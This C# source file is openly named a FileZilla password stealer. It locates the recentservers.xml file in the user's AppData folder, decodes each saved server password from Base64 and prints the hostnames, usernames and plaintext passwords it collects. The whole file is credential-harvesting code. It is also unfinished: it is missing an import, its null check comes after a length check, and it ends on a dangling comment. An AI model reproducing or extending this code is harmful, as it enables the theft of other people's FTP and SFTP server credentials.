using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Xml;

namespace FZPasswordStealler.App
{
    public class Connection
    {
        public string connectionName { get; set; }
        public string password { get; set; }
        public string username { get; set; }
        public string hostname { get; set; }
        public string proto { get; set; }
    }

    public class ConfigParser
    {
        public static List<Connection> ConfigParse(string pathToXml)
        {
            XmlDocument xDoc = new XmlDocument();
            string appDataPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            if (pathToXml.Length == 0 || pathToXml == null)
            {
                pathToXml = Path.Combine(appDataPath, "FileZilla", "recentservers.xml");
            }

            xDoc.Load(pathToXml);

            XmlElement? xRoot = xDoc.DocumentElement;
            List<Connection> connections = new List<Connection>();
            foreach (XmlElement XE in ((XmlElement)xDoc.GetElementsByTagName("RecentServers")[0]).GetElementsByTagName("Server"))
            {
                var host = XE.GetElementsByTagName("Host")[0].InnerText;
                var port = XE.GetElementsByTagName("Port")[0].InnerText;
                var username = XE.GetElementsByTagName("User")[0].InnerText;
                var password = (Encoding.UTF8.GetString(Convert.FromBase64String(XE.GetElementsByTagName("Pass")[0].InnerText)));

                if (!string.IsNullOrEmpty(host) && !string.IsNullOrEmpty(port) && !string.IsNullOrEmpty(username) && !string.IsNullOrEmpty(password))
                {
                    Connection con = new Connection();
                    con.hostname = host;
                    con.username = username;
                    con.password = password;
                    connections.Add(con);
                }
                else
                {
                    break;
                }
            }
     
            foreach (Connection c in connections)
            {
                Console.WriteLine(c.password);
            }
            return connections;
        }

        //int le = 
            
}

    
}
